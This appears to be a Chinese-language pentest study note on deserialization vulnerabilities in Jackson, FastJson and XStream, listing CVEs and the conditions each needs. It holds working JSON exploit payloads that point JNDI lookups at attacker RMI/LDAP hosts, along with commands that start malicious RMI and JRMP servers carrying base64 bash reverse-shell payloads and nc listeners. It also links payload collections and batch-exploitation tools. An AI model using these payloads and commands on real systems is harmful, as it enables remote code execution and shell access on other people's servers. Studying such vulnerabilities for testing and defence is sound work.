---
title: "组件安全：Jackson、FastJson、XStream"
pubDate: 2026-08-07
tags:
  - 安全
  - Java
---

三个都是 Java 里做序列化/反序列化的库：Jackson 和 FastJson 处理 JSON，XStream 处理 XML。漏洞套路一致——反序列化时能实例化任意类，配合 JNDI 注入或 gadget 链打 RCE。和上一讲 Solr/Shiro/Log4j 的区别：那些是服务/框架组件，这三个是数据解析库，触发点在"接受外部 JSON/XML 输入并反序列化"的代码处

## 黑白盒判断

- 黑盒：BP 抓包看请求格式，XML 传输→XStream，JSON 传输→FastJson 或 Jackson；提交畸形数据看报错信息能区分组件
- 白盒：直接看 pom.xml/引用的组件版本

## Jackson CVE-2020-8840（xbean JndiConverter，JNDI RCE）

默认黑名单漏了 `org.apache.xbean.propertyeditor.JndiConverter`，开多态时 JSON 传 `["类名",{"asText":"ldap://evil"}]` 触发 `setAsText()→lookup()`条件：开启多态（`enableDefaultTyping()`/`@JsonTypeInfo`）+ 类路径有 xbean-reflect + JDK≤8u191 可直接远程加载

```
content=["org.apache.xbean.propertyeditor.JndiConverter",{"asText":"rmi://攻击机:1099/xxx"}]
```

## Jackson CVE-2020-35728（WebLogic JNDIConnectionPool，JNDI RCE）

黑名单漏了 WebLogic 自带的 `JNDIConnectionPool`，开多态传 `@class` 触发 JNDI。条件：开多态 + 类路径有该类（WebLogic 12c/14c 自带）+ JDK 版本

```
["com.oracle.wls.shaded.org.apache.xalan.lib.sql.JNDIConnectionPool",{"jndiPath":"rmi://攻击机:1099/xxx"}]
```

## Jackson CVE-2023-35116（BasicDataSource 派生类，二次反序列化 RCE）

2.15.0~2.15.1 修 CVE-2022-42003 只拉黑 BasicDataSource 本身，没限制派生类和 `driverClassLoader`，子类+二次反序列化继续打 条件：开多态 + commons-dbcp 2.x + 入口字段是 Object/Serializable/DataSource

## FastJson ≤1.2.24（@type JdbcRowSetImpl，JNDI RCE）

最经典的 FastJson 漏洞，`@type` 指定任意类自动反序列化触发 setter。JDK≤8u191 可远程加载

```json
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://evil:9999/evilFile","autoCommit":true}
```

## FastJson ≤1.2.47（两段式绕 AutoType，通杀）

1.2.25+ 加了 AutoType 黑名单，但 `java.lang.Class` 不在限制内。第一段用 Class 把 JdbcRowSetImpl 写进缓存，第二段再反序列化缓存类，即使 AutoType 关闭也能触发

```json
{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://evil:1389/xxx","autoCommit":true}}
```

## FastJson ≤1.2.80（BasicDataSource+BCEL，需第三方库）

1.2.48+ 修了 Class 缓存绕过，1.2.80 用 expectClass 机制 + BasicDataSource 配 BCEL ClassLoader。利用条件苛刻，只能用源码里已引入的第三方库

```json
{"@type":"java.lang.Class","val":"org.apache.tomcat.dbcp.dbcp2.BasicDataSource"}
{"@type":"java.lang.Class","val":"com.sun.org.apache.bcel.internal.util.ClassLoader"}
{"@type":"org.apache.tomcat.dbcp.dbcp2.BasicDataSource","driverClassLoader":{"@type":"com.sun.org.apache.bcel.internal.util.ClassLoader"},"driverClassName":"$$BCEL$$$..."}
```

PoC 合集：https://github.com/kezibei/fastjson_payload

## XStream CVE-2021-21351（sorted-set 链，JNDI RCE）

`EventHandler`+`ProcessBuilder` 动态代理链，无需第三方库。版本 ≤1.4.15（1.4.16 起默认黑名单）。条件 `xstream.fromXml()` 接受外部输入 + 没配安全框架 + JVM≥8

生成恶意 RMI 服务：

```
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,反弹base64}|{base64,-d}|{bash,-i}" -A 攻击机IP
nc -lvvp 9900
```

POST 提交 XML payload（sorted-set 包裹 JdbcRowSetImpl 触发 JNDI，dataSource 填恶意地址）

## XStream CVE-2021-29505（PriorityQueue 链，JNDI RCE）

用 ysoserial 起 JRMPListener：

```
java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 "bash -c {echo,反弹base64}|{base64,-d}|{bash,-i}"
nc -lvvp 9900
```

POST 提交 XML payload（PriorityQueue 包裹 Rdn$RdnEntry→XString→SAAJMessage→RegistryImpl_Stub，host/port 填 RMI 地址）

## XStream CVE-2021-39144（InitialContext JNDI 注入）

反序列化 `javax.naming.InitialContext` 触发 JNDI 注入，类似 Log4j

## 工具

- FastJson：JsonExp（https://github.com/smallfox233/JsonExp）、FastjsonScan、FastJson_JackSon 图形化——批量跑 payload
- Jackson：本地 demo 演示为主（`mapper.enableDefaultTyping()` + `readValue(用户输入, Object.class)`）

## 要点

三个组件都是反序列化漏洞，核心条件一致：接受外部输入反序列化 + 能实例化任意类 + 有可用的 gadget/JNDI。判断顺序：黑盒看数据格式定组件→报错/响应确认版本→套对应版本 payload
